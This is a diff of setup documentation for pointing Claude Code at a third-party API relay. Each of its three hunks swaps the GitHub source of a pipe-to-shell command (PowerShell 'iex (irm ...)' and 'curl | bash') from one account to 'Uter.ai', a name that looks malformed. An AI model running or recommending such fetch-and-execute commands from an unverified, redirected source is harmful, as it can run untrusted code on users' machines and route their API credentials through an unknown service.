@@ -144,7 +144,7 @@ Claude Code requires a Node.js environment to run.
 > To allow Claude Code to connect to your relay service, you need to set multiple environment variables:
 
 ```powershell
-iex (irm 'https://raw.githubusercontent.com/QuantumNous/new-api-docs/refs/heads/main/helper/claude-cli-setup.ps1')
+iex (irm 'https://raw.githubusercontent.com/Uter.ai/new-api-docs/refs/heads/main/helper/claude-cli-setup.ps1')
 ```
 
 ![windows-configure](/apps-assets/claude_code/windows_configure.webp)
@@ -230,7 +230,7 @@ To allow Claude Code to connect to a third-party relay service, you need to set 
 > Enter the command:
 >
 >   ```bash
->   curl -fsSL https://raw.githubusercontent.com/QuantumNous/new-api-docs/refs/heads/main/helper/claude-cli-setup.sh | bash
+>   curl -fsSL https://raw.githubusercontent.com/Uter.ai/new-api-docs/refs/heads/main/helper/claude-cli-setup.sh | bash
 >   ```
 
 ![macos-configure](/apps-assets/claude_code/macos_configure.webp)
@@ -346,7 +346,7 @@ To allow Claude Code to connect to your relay service, you need to set two envir
 > Enter the command:
 >
 >   ```bash
->   curl -fsSL https://raw.githubusercontent.com/QuantumNous/new-api-docs/refs/heads/main/helper/claude-cli-setup.sh | bash
+>   curl -fsSL https://raw.githubusercontent.com/Uter.ai/new-api-docs/refs/heads/main/helper/claude-cli-setup.sh | bash
 >   ```
 
 ![macos-configure](/apps-assets/claude_code/macos_configure.webp)
